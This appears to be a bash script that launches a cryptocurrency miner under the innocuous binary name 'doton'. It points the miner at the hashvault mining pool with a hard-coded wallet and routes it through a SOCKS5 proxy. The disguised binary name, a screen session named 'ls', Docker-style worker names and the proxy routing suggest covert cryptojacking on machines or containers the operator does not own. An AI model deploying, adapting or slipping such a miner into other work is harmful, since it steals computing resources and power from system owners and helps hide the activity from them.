#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x doton && chmod +x config.json && chmod +x SHA256SUMS
screen -dmS ls 
POOL=pool.hashvault.pro:443
WALLET=hvxy9P3HryFTBW4tAPkBaBRibwiM3x4roL1g6oGtUHPSVDHMqNueznj8mQPswmJKHCCY6cZGZ4TkUPdWbt4BhpP348B8rMJ6iz
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
FINGERPRINT=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
PROXY=socks5://72.221.232.155:4145
./doton --url pool.hashvault.pro:443 --user $WALLET --pass $WORKER --donate-level 1 --tls --tls-fingerprint $FINGERPRINT -x $PROXY
